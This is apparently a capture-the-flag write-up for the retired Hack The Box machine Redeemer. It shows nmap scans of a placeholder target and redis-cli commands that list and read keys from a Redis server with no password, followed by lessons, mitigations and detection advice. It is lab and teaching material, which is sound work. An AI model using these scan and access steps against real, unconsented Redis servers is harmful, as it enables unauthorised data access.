---
machine: Redeemer
os: Linux
difficulty: Very Easy
platform: Hack The Box
achievement: https://labs.hackthebox.com/achievement/machine/4187928/472
category: Starting Point
state: Retired
pwned: 2026-11-02
tags: [linux, redis, no-auth]
---

# Redeemer — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **Retired** Starting Point machine (Tier 0). No flags in this document.

## TL;DR

Redis listening with no password. Connect with `redis-cli`, enumerate the databases, and the flag is the value of a key. Two commands.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sV -p 6379 <TARGET_IP>
```

| Port | Service | Version |
|---|---|---|
| 6379/tcp | Redis | no authentication |

## Foothold

```bash
redis-cli -h <TARGET_IP>
```

```
<IP>:6379> info
# Server
redis_version:...
```

```
<IP>:6379> select 0
OK
<IP>:6379> keys *
1) "flag"
2) "temp"
3) "num"
<IP>:6379> get flag
"<FLAG>"
```

No exploit and no credentials were needed: the port is exposed and `protected-mode` is off.

## Evidence

- `nmap` showing 6379 open and the Redis version.
- `keys *` and `get flag` with the value cropped.

## Lessons learned

- Redis stores data in clear text: port access means data access.
- `select <n>` walks the 16 default databases; a key may live in any of them.
- A service on an unusual port is still a service: `-p-` is mandatory.

## Mitigations and detection

- `requirepass` with a strong password plus per-application ACLs (`ACL SETUSER`).
- `bind 127.0.0.1` and `protected-mode yes`; never expose Redis to the Internet.
- Disable dangerous commands (`CONFIG`, `EVAL`, `FLUSHALL`) for application users.
- Detection: connections from unexpected IPs to 6379 and failed `AUTH` attempts in the log.

## References

- <https://redis.io/docs/latest/operate/oss_and_stack/management/security/>
- <https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html>
